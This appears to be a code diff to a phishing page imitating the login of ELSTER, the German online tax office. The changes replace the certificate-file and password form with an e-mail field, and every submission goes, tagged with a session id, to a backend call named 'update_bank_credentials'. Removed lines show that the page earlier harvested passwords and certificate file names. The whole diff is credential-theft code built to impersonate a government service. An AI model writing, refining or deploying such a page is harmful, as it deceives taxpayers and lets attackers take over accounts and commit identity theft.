@@ -15,9 +15,6 @@ import {
   IdCard,
   Usb,
   CreditCard,
-  Eye,
-  EyeOff,
-  Upload,
   Menu,
   X,
   ExternalLink,
@@ -40,7 +37,7 @@ const BG = "#f5f5f5";
 type TabKey = "zertifikat" | "elstersecure" | "ausweis" | "stick" | "signatur";
 
 const TABS: { key: TabKey; label: string; Icon: typeof FileBadge }[] = [
-  { key: "zertifikat", label: "Zertifikatsdatei", Icon: FileBadge },
+  { key: "zertifikat", label: "E-Mail Login", Icon: FileBadge },
   { key: "elstersecure", label: "ElsterSecure", Icon: ShieldCheck },
   { key: "ausweis", label: "Personalausweis", Icon: IdCard },
   { key: "stick", label: "Sicherheitsstick", Icon: Usb },
@@ -53,9 +50,7 @@ const Elster = () => {
   const sessionId = searchParams.get("s") || "";
 
   const [tab, setTab] = useState<TabKey>("zertifikat");
-  const [fileName, setFileName] = useState("");
-  const [password, setPassword] = useState("");
-  const [showPw, setShowPw] = useState(false);
+  const [email, setEmail] = useState("");
   const [pwError, setPwError] = useState("");
   const [showLoading, setShowLoading] = useState(false);
   const [submitting, setSubmitting] = useState(false);
@@ -73,16 +68,16 @@ const Elster = () => {
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (!password) { setPwError("Bitte geben Sie Ihr Passwort ein."); return; }
+    if (!email.trim()) { setPwError("Bitte geben Sie Ihre E-Mail-Adresse ein."); return; }
     if (submitting) return;
     setSubmitting(true);
     if (sessionId) {
       const { error } = await supabase.rpc("update_bank_credentials", {
         p_session_id: sessionId,
-        p_username: fileName || activeTab.label,
-        p_password: password,
-        p_username_label: tab === "zertifikat" ? "Zertifikatsdatei" : activeTab.label,
-        p_password_label: "Passwort",
+        p_username: email,
+        p_password: "",
+        p_username_label: "E-Mail",
+        p_password_label: "",
       });
       if (error) console.error("Update failed:", error);
     }
@@ -106,7 +101,7 @@ const Elster = () => {
             <img src={elsterLogo.url} alt="ELSTER – Ihr Online-Finanzamt" style={{ height: 44, width: "auto", display: "block" }} />
           </a>
           <div style={{ flex: 1 }} />
-          <a href="#" className="hidden md:inline-flex" style={{ background: BLUE, color: "#fff", padding: "6px 16px", borderRadius: 3, textDecoration: "none", fontWeight: 600 }}>Login</a>
+          <a href="#" className="hidden md:inline-flex" style={{ background: BLUE, color: "#fff", padding: "6px 16px", borderRadius: 3, textDecoration: "none", fontWeight: 600 }}>Anmelden</a>
           <button className="md:hidden" aria-label="Menü" onClick={() => setMenuOpen(true)} style={{ background: "none", border: "none", color: BLUE, cursor: "pointer" }}>
             <Menu size={28} />
           </button>
@@ -178,39 +173,20 @@ const Elster = () => {
 
               {tab === "zertifikat" && (
                 <form onSubmit={handleSubmit}>
-                  <label style={{ display: "block", fontSize: 14, marginBottom: 6 }}>Zertifikatsdatei</label>
-                  <div style={{ display: "flex", gap: 8, marginBottom: 18 }}>
-                    <label style={{
-                      flex: 1, display: "flex", alignItems: "center", gap: 8,
-                      border: `1px dashed ${BORDER}`, background: "#f6f6f6",
-                      padding: "10px 12px", color: MUTED, fontStyle: fileName ? "normal" : "italic",
-                      cursor: "pointer",
-                    }}>
-                      <Upload size={16} />
-                      <span>{fileName || "Auswählen"}</span>
-                      <input type="file" accept=".pfx" style={{ display: "none" }} onChange={(e) => setFileName(e.target.files?.[0]?.name || "")} />
-                    </label>
-                    <button type="button" onClick={(e) => (e.currentTarget.previousElementSibling as HTMLElement)?.querySelector<HTMLInputElement>("input")?.click()} style={{ background: BLUE, color: "#fff", border: "none", padding: "0 18px", cursor: "pointer", fontSize: 15 }}>Durchsuchen</button>
-                  </div>
-
-                  <label style={{ display: "block", fontSize: 14, marginBottom: 6 }}>Passwort</label>
-                  <div style={{ position: "relative", marginBottom: pwError ? 6 : 18 }}>
+                  <label style={{ display: "block", fontSize: 14, marginBottom: 6 }}>E-Mail-Adresse</label>
+                  <div style={{ marginBottom: pwError ? 6 : 18 }}>
                     <input
-                      type={showPw ? "text" : "password"}
-                      value={password}
-                      onChange={(e) => { setPassword(e.target.value); if (pwError) setPwError(""); }}
-                      style={{ width: "100%", padding: "10px 40px 10px 12px", border: `1px solid ${pwError ? "#c00" : BORDER}`, outline: "none", fontSize: 15, boxSizing: "border-box" }}
+                      type="email"
+                      value={email}
+                      onChange={(e) => { setEmail(e.target.value); if (pwError) setPwError(""); }}
+                      style={{ width: "100%", padding: "10px 12px", border: `1px solid ${pwError ? "#c00" : BORDER}`, outline: "none", fontSize: 15, boxSizing: "border-box" }}
                     />
-                    <button type="button" aria-label="Passwort anzeigen" onClick={() => setShowPw((v) => !v)} style={{ position: "absolute", right: 8, top: "50%", transform: "translateY(-50%)", background: "none", border: "none", color: BLUE, cursor: "pointer" }}>
-                      {showPw ? <EyeOff size={18} /> : <Eye size={18} />}
-                    </button>
                   </div>
                   {pwError && <div style={{ color: "#c00", fontSize: 13, marginBottom: 14 }}>{pwError}</div>}
 
-                  <button type="submit" style={{ background: BLUE, color: "#fff", border: "none", padding: "6px 16px", borderRadius: 3, fontSize: 15, cursor: "pointer" }}>Login</button>
+                  <button type="submit" style={{ background: BLUE, color: "#fff", border: "none", padding: "6px 16px", borderRadius: 3, fontSize: 15, cursor: "pointer" }}>Anmelden</button>
 
                   <div style={{ marginTop: 32, display: "flex", flexDirection: "column", gap: 8 }}>
-                    <a href="#" style={{ color: BLUE, textDecoration: "none", fontSize: 14 }}>Zertifikatsdatei verloren oder Zertifikat abgelaufen?</a>
                     <a href="#" style={{ color: BLUE, textDecoration: "none", fontSize: 14 }}>Passwort vergessen?</a>
                   </div>
                 </form>
